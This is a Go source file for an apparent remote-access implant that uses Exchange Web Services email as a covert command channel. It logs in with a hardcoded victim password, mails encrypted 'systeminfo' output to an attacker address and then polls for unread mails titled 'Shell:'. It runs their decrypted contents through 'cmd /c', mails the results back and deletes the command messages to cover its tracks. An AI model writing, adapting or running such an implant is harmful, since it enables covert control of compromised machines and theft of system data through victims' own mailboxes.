package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/xml"
	"fmt"
	"io"
	"io/ioutil"
	rand2 "math/rand"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"
	"unsafe"
)

type Info struct {
	Attacker       string `validate:"required"`
	AttackerDomain string `validate:"required"`
	Victim         string `validate:"required"`
	VictimPassword string `validate:"required"`
	VictimUrl      string `validate:"required"`
	VictimDomain   string `validate:"required"`
	Key            string `validate:"required"`
	ListenerId     string `validate:"required"`
	TargetId       string `validate:"required"`
}

type Envelope struct {
	XMLName xml.Name `xml:"Envelope"`
	Body    struct {
		Fault              *Fault              `xml:"Fault,omitempty"`
		GetItemResponse    *GetItemResponse    `xml:"GetItemResponse,omitempty"`
		FindItemResponse   *FindItemResponse   `xml:"FindItemResponse,omitempty"`
		CreateItemResponse *CreateItemResponse `xml:"CreateItemResponse,omitempty"`
	} `xml:"Body"`
}

type Fault struct {
	Code        string `xml:"faultcode,attr"`
	String      string `xml:"faultstring,attr"`
	Actor       string `xml:"faultactor,attr"`
	Detail      string `xml:"detail,attr"`
	FaultString string `xml:"Text,omitempty"`
}

type GetItemResponse struct {
	ResponseMessages struct {
		GetItemResponseMessage []struct {
			ResponseCode string `xml:"ResponseCode"`
			RootFolder   struct {
				Items struct {
					Message []struct {
						Type  string `xml:"Type,attr"`
						Value string `xml:",innerxml"`
					} `xml:"Message"`
				} `xml:"Items"`
			} `xml:"RootFolder"`
			Items struct {
				Message struct {
					ItemId struct {
						Id        string `xml:"Id,attr"`
						ChangeKey string `xml:"ChangeKey,attr"`
					} `xml:"ItemId"`
					ParentFolderId struct {
						Id        string `xml:"Id,attr"`
						ChangeKey string `xml:"ChangeKey,attr"`
					} `xml:"ParentFolderId"`
					ItemClass   string `xml:"ItemClass"`
					Subject     string `xml:"Subject"`
					Sensitivity string `xml:"Sensitivity"`
					Body        struct {
						BodyType    string `xml:"BodyType,attr"`
						IsTruncated string `xml:"IsTruncated,attr"`
						Text        string `xml:",chardata"`
					} `xml:"Body"`
					DateTimeReceived       string `xml:"DateTimeReceived"`
					Size                   int    `xml:"Size"`
					Importance             string `xml:"Importance"`
					IsSubmitted            bool   `xml:"IsSubmitted"`
					IsDraft                bool   `xml:"IsDraft"`
					IsFromMe               bool   `xml:"IsFromMe"`
					IsResend               bool   `xml:"IsResend"`
					IsUnmodified           bool   `xml:"IsUnmodified"`
					InternetMessageHeaders struct {
						InternetMessageHeader []struct {
							HeaderName string `xml:"HeaderName,attr"`
							Text       string `xml:",chardata"`
						} `xml:"InternetMessageHeader"`
					} `xml:"InternetMessageHeaders"`
					DateTimeSent           string `xml:"DateTimeSent"`
					DateTimeCreated        string `xml:"DateTimeCreated"`
					AllowedResponseActions struct {
						ResponseAction []string `xml:"ResponseAction"`
					} `xml:"AllowedResponseActions"`
					ReminderDueBy              string `xml:"ReminderDueBy"`
					IsReminderSet              bool   `xml:"IsReminderSet"`
					ReminderMinutesBeforeStart int    `xml:"ReminderMinutesBeforeStart"`
					DisplayCc                  string `xml:"DisplayCc"`
					DisplayTo                  string `xml:"DisplayTo"`
					HasAttachments             bool   `xml:"HasAttachments"`
					ExtendedProperty           []struct {
						ExtendedFieldURI struct {
							FieldURI string `xml:"FieldURI,attr"`
						} `xml:"ExtendedFieldURI"`
						Value string `xml:"Value"`
					} `xml:"ExtendedProperty"`
					Culture         string `xml:"Culture"`
					EffectiveRights struct {
						CreateAssociated bool `xml:"CreateAssociated"`
						CreateContents   bool `xml:"CreateContents"`
						CreateHierarchy  bool `xml:"CreateHierarchy"`
						Delete           bool `xml:"Delete"`
						Modify           bool `xml:"Modify"`
					} `xml:"EffectiveRights"`
					IsRead bool `xml:"IsRead"`
					From   struct {
						Mailbox struct {
							EmailAddress string `xml:"EmailAddress"`
						} `xml:"Mailbox"`
					} `xml:"From"`
					TextBody struct {
						BodyType    string `xml:"BodyType,attr"`
						IsTruncated string `xml:"IsTruncated,attr"`
						Text        string `xml:",chardata"`
					} `xml:"TextBody"`
				} `xml:"Message"`
			} `xml:"Items"`
		} `xml:"GetItemResponseMessage"`
	} `xml:"ResponseMessages"`
}

type FindItemResponse struct {
	ResponseMessages struct {
		FindItemResponseMessage struct {
			RootFolder struct {
				Items struct {
					Message []struct {
						ItemId struct {
							Id string `xml:"Id,attr"`
						} `xml:"ItemId"`
						Subject          string `xml:"Subject"`
						DateTimeReceived string `xml:"DateTimeReceived"`
					} `xml:"Message"`
				} `xml:"Items"`
				TotalItemsInView string `xml:"TotalItemsInView,attr"`
			} `xml:"RootFolder"`
		} `xml:"FindItemResponseMessage"`
	} `xml:"ResponseMessages"`
}

type CreateItemResponse struct {
	ResponseMessages struct {
		CreateItemResponseMessage []struct {
			Items struct {
				Message []struct {
					ItemId struct {
						Id string `xml:"Id,attr"`
					} `xml:"ItemId"`
				} `xml:"Message"`
			} `xml:"Items"`
		} `xml:"CreateItemResponseMessage"`
	} `xml:"ResponseMessages"`
}

var src = rand2.NewSource(time.Now().UnixNano())

const (
	letterIdxBits = 6
	letterIdxMask = 1<<letterIdxBits - 1
	letterIdxMax  = 63 / letterIdxBits
)

const letterBytes = "0123456789abcdef"

func RandStringBytesMaskImprSrcUnsafe(n int) string {
	b := make([]byte, n)
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return *(*string)(unsafe.Pointer(&b))
}

var info = Info{Attacker: "bank\\test", AttackerDomain: "test.com", Victim: "bank\\test", VictimPassword: "$test", VictimUrl: "https://mail.test.com/ews/exchange.asmx", VictimDomain: "test.com", ListenerId: "d7dcd7a28dea", Key: "cd69da272b895b69aa418fc90ebf098e7e2c100d07cf18ca3cecb4ed2462baec", TargetId: RandStringBytesMaskImprSrcUnsafe(12)}

func sendRequest(server string, username string, password string, body string) (string, int, string, error) {
	// Create a new HTTP client
	// client := &http.Client{}
	proxyURL, err := url.Parse("http://127.0.0.1:8080")
	if err != nil {
		return "", 0, "", err
	}

	client := &http.Client{
		// Set the proxy for the client
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			// Set the TLS client config for the proxy
			TLSClientConfig: &tls.Config{
				// Set the server name to match the proxy certificate
				ServerName:         "127.0.0.1",
				InsecureSkipVerify: true,
			},
		},
	}
	// Create a new HTTP request
	req, err := http.NewRequest("POST", server, strings.NewReader(body))

	if err != nil {
		return "", 0, "", err
	}
	// Set the authorization header
	req.SetBasicAuth(username, password)
	// Set the content type header
	req.Header.Set("Content-Type", "text/xml")
	// Send the request to the server
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, "", err
	}
	// Read the response body
	defer resp.Body.Close()
	bytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", 0, "", err
	}
	// Return the response body and status code and status
	return string(bytes), resp.StatusCode, resp.Status, nil
}

func sendMail(to, subject, body string) error {
	// Set the request body
	requestBody := fmt.Sprintf(`
		<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
					   xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
					   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
		  <soap:Header>
			<t:RequestServerVersion Version="Exchange2016" />
		  </soap:Header>
		  <soap:Body>
			<m:CreateItem MessageDisposition="SendAndSaveCopy">
			  <m:Items>
				<t:Message>
				  <t:Subject>%s</t:Subject>
				  <t:Body BodyType="HTML">%s</t:Body>
				  <t:ToRecipients>
					<t:Mailbox>
					  <t:EmailAddress>%s</t:EmailAddress>
					</t:Mailbox>
				  </t:ToRecipients>
				</t:Message>
			  </m:Items>
			</m:CreateItem>
		  </soap:Body>
		</soap:Envelope>
	`, subject, body, to)

	// Send the request to the server
	_, statusCode, statusMessage, err := sendRequest(info.VictimUrl, info.Victim, info.VictimPassword, requestBody)
	if err != nil {
		return err
	}

	// Check the response status code
	if statusCode != 200 {
		return fmt.Errorf("Error sending email: %d %s", statusCode, statusMessage)
	}

	return nil
}

func getEmailContent(emailID string) (string, string, string, bool, string, error) {
	// Set the request body
	requestBody := fmt.Sprintf(`
		<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
					   xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
					   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
		  <soap:Header>
			<t:RequestServerVersion Version="Exchange2016" />
		  </soap:Header>
		  <soap:Body>
			<m:GetItem>
			  <m:ItemShape>
			  <t:AdditionalProperties>
			  	<t:FieldURI FieldURI="item:Subject" />
				<t:FieldURI FieldURI="item:TextBody" />
				<t:FieldURI FieldURI="item:TextBody" />
				<t:FieldURI FieldURI="message:From" />
				<t:FieldURI FieldURI="message:IsRead" />
			</t:AdditionalProperties>
			  </m:ItemShape>
			  <m:ItemIds>
				<t:ItemId Id="%s" />
			  </m:ItemIds>
			</m:GetItem>
		  </soap:Body>
		</soap:Envelope>
	`, emailID)

	// Send the request to the server
	response, statusCode, statusMessage, err := sendRequest(info.VictimUrl, info.Victim, info.VictimPassword, requestBody)

	if err != nil {
		return "", "", "", false, "", err
	}

	// Check the response status code
	if statusCode != 200 {
		return "", "", "", false, "", fmt.Errorf("Error getting email: %d %s", statusCode, statusMessage)
	}

	// Parse the response XML
	var envelope Envelope
	if err := xml.Unmarshal([]byte(response), &envelope); err != nil {
		fmt.Println(err)
		return "", "", "", false, "", err
	}

	// Check if the response is an error
	if envelope.Body.Fault != nil {
		return "", "", "", false, "", fmt.Errorf("Error getting email: %s", envelope.Body.Fault.FaultString)
	}

	// Get the email properties
	// emailProperties := envelope.Body.GetItemResponse.ResponseMessages.GetItemResponseMessage[0].Items.Message.InternetMessageHeaders.InternetMessageHeader
	subject := envelope.Body.GetItemResponse.ResponseMessages.GetItemResponseMessage[0].Items.Message.Subject
	body := envelope.Body.GetItemResponse.ResponseMessages.GetItemResponseMessage[0].Items.Message.TextBody.Text
	isRead := envelope.Body.GetItemResponse.ResponseMessages.GetItemResponseMessage[0].Items.Message.IsRead
	from := envelope.Body.GetItemResponse.ResponseMessages.GetItemResponseMessage[0].Items.Message.From.Mailbox.EmailAddress
	changeKey := envelope.Body.GetItemResponse.ResponseMessages.GetItemResponseMessage[0].Items.Message.ItemId.ChangeKey
	// Iterate through the email properties
	// for _, property := range emailProperties {
	// 	// Get the property name and value

	// 	name := property.HeaderName
	// 	value := property.Text
	// 	fmt.Println(name, " = ", value)
	// 	// Check the property name
	// 	switch name {
	// 	case "Subject":
	// 		subject = value
	// 	case "Body":
	// 		body = value
	// 	case "IsRead":
	// 		if value == "true" {
	// 			isRead = true
	// 		}
	// 	}
	// }

	// Return the subject, body, and isRead
	return from, subject, body, isRead, changeKey, nil
}

func receiveEmails() ([]string, error) {
	// Set the request body
	requestBody := `
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
      <soap:Header>
        <t:RequestServerVersion Version="Exchange2016" />
      </soap:Header>
      <soap:Body>
        <m:FindItem Traversal="Shallow">
          <m:ItemShape>
            <t:BaseShape>IdOnly</t:BaseShape>
            <t:AdditionalProperties>
              <t:FieldURI FieldURI="item:Subject" />
              <t:FieldURI FieldURI="item:DateTimeReceived" />
            </t:AdditionalProperties>
          </m:ItemShape>
          <m:IndexedPageItemView MaxEntriesReturned="10" Offset="0" BasePoint="Beginning" />
          <m:ParentFolderIds>
            <t:DistinguishedFolderId Id="inbox" />
          </m:ParentFolderIds>
        </m:FindItem>
      </soap:Body>
    </soap:Envelope>
	`

	// Send the request to the server
	response, statusCode, statusMessage, err := sendRequest(info.VictimUrl, info.Victim, info.VictimPassword, requestBody)
	if err != nil {
		return nil, err
	}

	// Check the response status code
	if statusCode != 200 {
		return nil, fmt.Errorf("Error receiving emails: %d %s", statusCode, statusMessage)
	}

	// Parse the response XML
	var envelope Envelope
	if err := xml.Unmarshal([]byte(response), &envelope); err != nil {
		return nil, err
	}

	// Check if the response is an error
	if envelope.Body.Fault != nil {
		return nil, fmt.Errorf("Error receiving emails: %s", envelope.Body.Fault.FaultString)
	}

	// Get the email IDs
	emailIDs := make([]string, 0)
	for _, item := range envelope.Body.FindItemResponse.ResponseMessages.FindItemResponseMessage.RootFolder.Items.Message {
		emailIDs = append(emailIDs, item.ItemId.Id)
	}

	// Return the email IDs
	return emailIDs, nil
}

func receiveEmailsByAddress(FromAddress string) ([]string, error) {
	// Set the request body
	requestBody := fmt.Sprintf(`
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
      <soap:Header>
        <t:RequestServerVersion Version="Exchange2016" />
      </soap:Header>
      <soap:Body>
        <m:FindItem Traversal="Shallow">
          <m:ItemShape>
            <t:BaseShape>IdOnly</t:BaseShape>
            <t:AdditionalProperties>
              <t:FieldURI FieldURI="item:Subject" />
              <t:FieldURI FieldURI="item:DateTimeReceived" />
            </t:AdditionalProperties>
          </m:ItemShape>
          <m:IndexedPageItemView MaxEntriesReturned="10" Offset="0" BasePoint="Beginning" />
          <m:ParentFolderIds>
            <t:DistinguishedFolderId Id="inbox" />
          </m:ParentFolderIds>
		  <m:Restriction>
		  	<t:And>
          		<t:IsEqualTo>
            		<t:FieldURI FieldURI="message:Sender" />
            		<t:FieldURIOrConstant>
              			<t:Constant Value="%s" />
            		</t:FieldURIOrConstant>
          		</t:IsEqualTo>
				<t:IsEqualTo>
					<t:FieldURI FieldURI="message:IsRead" />
					<t:FieldURIOrConstant>
    					<t:Constant Value="false" />
					</t:FieldURIOrConstant>
				</t:IsEqualTo>
			</t:And>
      	   </m:Restriction>
        </m:FindItem>
      </soap:Body>
    </soap:Envelope>
	`, FromAddress)

	// Send the request to the server
	response, statusCode, statusMessage, err := sendRequest(info.VictimUrl, info.Victim, info.VictimPassword, requestBody)
	if err != nil {
		return nil, err
	}

	// Check the response status code
	if statusCode != 200 {
		return nil, fmt.Errorf("Error receiving emails: %d %s", statusCode, statusMessage)
	}

	// Parse the response XML
	var envelope Envelope
	if err := xml.Unmarshal([]byte(response), &envelope); err != nil {
		return nil, err
	}

	// Check if the response is an error
	if envelope.Body.Fault != nil {
		return nil, fmt.Errorf("Error receiving emails: %s", envelope.Body.Fault.FaultString)
	}

	emailIDs := make([]string, 0)
	// Get the email IDs
	if envelope.Body.FindItemResponse.ResponseMessages.FindItemResponseMessage.RootFolder.TotalItemsInView == "0" {
		return emailIDs, nil
	}

	for _, item := range envelope.Body.FindItemResponse.ResponseMessages.FindItemResponseMessage.RootFolder.Items.Message {
		emailIDs = append(emailIDs, item.ItemId.Id)
	}

	// Return the email IDs
	return emailIDs, nil
}

func replyToEmail(emailID, changeKey, body string) error {
	// Set the request body
	requestBody := fmt.Sprintf(`
	<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
				   xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
				   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
	  <soap:Header>
		<t:RequestServerVersion Version="Exchange2016" />
	  </soap:Header>
	  <soap:Body>
	    <m:CreateItem MessageDisposition="SendAndSaveCopy">
      <m:Items>
        <t:ReplyAllToItem>
          <t:ReferenceItemId Id="%s" ChangeKey="%s"/>
          <t:NewBodyContent BodyType="Text">%s</t:NewBodyContent>
        </t:ReplyAllToItem>
      </m:Items>
    </m:CreateItem>
	  </soap:Body>
	</soap:Envelope>
	`, emailID, changeKey, body)

	// Send the request to the server
	_, statusCode, statusMessage, err := sendRequest(info.VictimUrl, info.Victim, info.VictimPassword, requestBody)
	if err != nil {
		return err
	}

	// Check the response status code
	if statusCode != 200 {
		return fmt.Errorf("Error sending email: %d %s", statusCode, statusMessage)
	}

	return nil
}

func deleteEmail(emailID string) error {
	// Set the request body
	requestBody := fmt.Sprintf(`
		<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
					   xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
					   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
		  <soap:Header>
			<t:RequestServerVersion Version="Exchange2016" />
		  </soap:Header>
		  <soap:Body>
			<m:DeleteItem>
			  <m:ItemIds>
				<t:ItemId Id="%s" />
			  </m:ItemIds>
			  <m:DeleteType>MoveToDeletedItems</m:DeleteType>
			</m:DeleteItem>
		  </soap:Body>
		</soap:Envelope>
	`, emailID)

	// Send the request to the server
	response, statusCode, statusMessage, err := sendRequest(info.VictimUrl, info.Victim, info.VictimPassword, requestBody)
	if err != nil {
		return err
	}

	// Check the response status code
	if statusCode != 200 {
		return fmt.Errorf("Error deleting email: %d %s", statusCode, statusMessage)
	}

	// Parse the response XML
	var envelope Envelope
	if err := xml.Unmarshal([]byte(response), &envelope); err != nil {
		return err
	}

	// Check if the response is an error
	if envelope.Body.Fault != nil {
		return fmt.Errorf("Error deleting email: %s", envelope.Body.Fault.FaultString)
	}

	return nil
}

func encrypt(stringToEncrypt string, keyString string) (encryptedString string) {
	if stringToEncrypt == "" {
		return ""
	}
	key, _ := hex.DecodeString(keyString)
	plaintext := []byte(stringToEncrypt)

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err.Error())
		return ""
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println(err.Error())
		return ""
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err.Error())
		return ""
	}

	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	return fmt.Sprintf("%x", ciphertext)
}

func decrypt(encryptedString string, keyString string) (decryptedString string) {
	if encryptedString == "" {
		return ""
	}
	key, _ := hex.DecodeString(keyString)
	enc, _ := hex.DecodeString(encryptedString)

	//Create a new Cipher Block from the key
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err.Error())
		return ""
	}

	//Create a new GCM
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println(err.Error())
		return ""
	}

	//Get the nonce size
	nonceSize := aesGCM.NonceSize()

	//Extract the nonce from the encrypted data
	nonce, ciphertext := enc[:nonceSize], enc[nonceSize:]

	//Decrypt the data
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err.Error())
		return ""
	}

	return fmt.Sprintf("%s", plaintext)
}

func main() {

	fmt.Println("InitServer")
	fmt.Println(info.TargetId)
	info.TargetId = "03213bd026be"
	AttackerAddress := strings.Split(info.Attacker, "\\")[1] + "@" + info.AttackerDomain

	outSystemInfo, err := exec.Command("cmd", "/c", "systeminfo").Output()
	if err != nil {
		fmt.Println(err)
		return
	}

	mailBody := encrypt(info.TargetId, info.Key) + "##" + encrypt(string(outSystemInfo), info.Key) + "#"

	err = sendMail(AttackerAddress, "ServerInit:"+info.ListenerId, mailBody)
	if err != nil {
		fmt.Println(err)
		return
	}

	for true {
		time.Sleep(2 * time.Second)
		emailIDs, err := receiveEmailsByAddress(AttackerAddress)
		if err != nil {
			continue
		}
		for _, emailID := range emailIDs {
			from, subject, body, isRead, _, err := getEmailContent(emailID)
			if err != nil || isRead {
				continue
			}
			body = strings.Trim(strings.Replace(body, "&#xD;", "", -1), "\r\n")
			s := strings.Split(body, "#")
			if len(s) != 2 || s[0] != info.TargetId {
				continue
			}
			switch subject {
			case "Shell:" + info.ListenerId:
				args := []string{"cmd", "/c"}
				args = append(args, decrypt(s[1], info.Key))
				out, err := exec.Command(args[0], args[1:]...).Output()
				if err != nil {
					fmt.Println("err: ", err)
					c := info.TargetId + "#" + encrypt(err.Error(), info.Key)
					sendMail(from, "ReShell:"+info.ListenerId, c)
					deleteEmail(emailID)
				} else {
					c := info.TargetId + "##" + encrypt(string(out), info.Key)
					sendMail(from, "ReShell:"+info.ListenerId, c)
					deleteEmail(emailID)
				}
			case "linux":
				fmt.Println("Linux.")
			default:
				fmt.Printf("aaaa")
			}

		}
	}
}
